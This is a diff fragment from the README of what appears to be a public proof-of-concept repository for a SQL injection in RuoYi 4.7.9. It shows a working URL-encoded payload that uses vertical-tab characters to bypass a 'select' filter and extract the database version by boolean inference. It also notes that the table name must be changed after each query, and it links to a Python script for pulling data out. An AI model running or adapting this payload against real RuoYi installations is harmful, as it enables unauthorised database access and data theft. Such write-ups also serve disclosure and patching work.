@@ -50,7 +50,7 @@ The regex select matches `select ` (followed by a space). It fails to match `sel
    sql=CREATE%20table%20j2iz96_665%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c5%2c1))%3d44%2c%201%2c%201%2f0)%3b
    ```
 **Caution**:  Need to change tablename in the CREATE query after every successful query.
-3. With the boolean-based SQL Injection, data can be exfiltrated using the Python poc in this repo   
+3. With the boolean-based SQL Injection, data can be exfiltrated using the Python [[poc]](https://github.com/mrlihd/Ruoyi-4.7.9-SQL-Injection-PoC/blob/main/ruoyi-sqli-poc.py) in this repo   
 **Usage**   
 <img width="583" height="219" alt="poc-usage" src="https://github.com/user-attachments/assets/b70658a6-e3b8-4704-86d5-7ecfd263eebf" />   
 **Exfiltrate DB version poc**   
